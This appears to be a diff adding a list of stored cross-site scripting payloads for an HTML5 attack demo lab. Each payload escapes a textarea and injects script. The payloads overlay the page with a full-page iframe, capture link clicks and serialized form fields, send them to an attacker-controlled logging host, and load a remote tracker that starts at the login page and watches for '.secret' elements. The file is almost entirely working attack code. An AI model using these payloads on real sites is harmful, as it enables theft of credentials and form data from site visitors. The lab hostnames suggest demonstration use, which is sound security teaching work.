@@ -1,0 +1,79 @@
+== add an iframe (clickjacking)
+
+</textarea><script>
+$('<iframe id=me>').appendTo('body').css({
+position: 'absolute',
+width: '100%',
+height: '100%',
+top: 0,
+left: 0,
+border: 0,
+background: '#fff'
+}
+).attr('src', location.href.replace(/\?.*/,''));
+</script>
+
+== hijack all links & forms
+
+</textarea><script>
+$('<iframe id=me>').css({
+position: 'absolute',
+width: '100%',
+height: '100%',
+top: 0,
+left: 0,
+border: 0,
+background: '#fff'
+}
+).appendTo('body').load(function() {
+var frame = this;
+console.log(this.contentDocument.body.scrollHeight); // in case we need to resize frame
+$('body',this.contentDocument).find('a').click(function() {
+console.log(this.href);
+}).end()
+.find('form').submit(function() {
+   console.log($(this).attr('action')|| frame.contentDocument.location.href, $(this).serialize());
+})
+}).attr('src', location.href.replace(/\?.*/,''));
+</script>
+
+== log to external
+
+</textarea><script>
+$('<iframe id=me>').css({
+position: 'absolute',
+width: '100%',
+height: '100%',
+top: 0,
+left: 0,
+border: 0,
+background: '#fff'
+}
+).appendTo('body').load(function() {
+var frame = this;
+var log = function(what) {
+    $.post('http://html5-attack.localhost/persistent_xss/log.php', what);
+};
+
+log(this.contentDocument.body.scrollHeight); // in case we need to resize frame
+$('body',this.contentDocument).find('a').click(function() {
+log({event:'click', 'href': this.href});
+}).end()
+.find('form').submit(function() {
+   log({event: 'form',
+        action: $(this).attr('action')|| frame.contentDocument.location.href,
+        fields: $(this).serialize()
+       });
+})
+}).attr('src', location.href.replace(/\?.*/,''));
+</script>
+
+== configurable log to external
+
+</textarea><script src="http://html5-attack.localhost/persistent_xss/track.js"></script>
+
+== configurable log - start at login
+</textarea><script src="http://html5-attack.localhost/persistent_xss/track.js?start=http%3A%2F%2Fhtml5.localhost%2Fpersistent_xss%2Fvuln%2Findex.php%3Fpage%3Dlogin"></script>
+
+== configurable log - start at login, watch for .secret
+</textarea><script src="http://html5-attack.localhost/persistent_xss/track.js?start=http%3A%2F%2Fhtml5.localhost%2Fpersistent_xss%2Fvuln%2Findex.php%3Fpage%3Dlogin&amp;observe=.secret"></script>
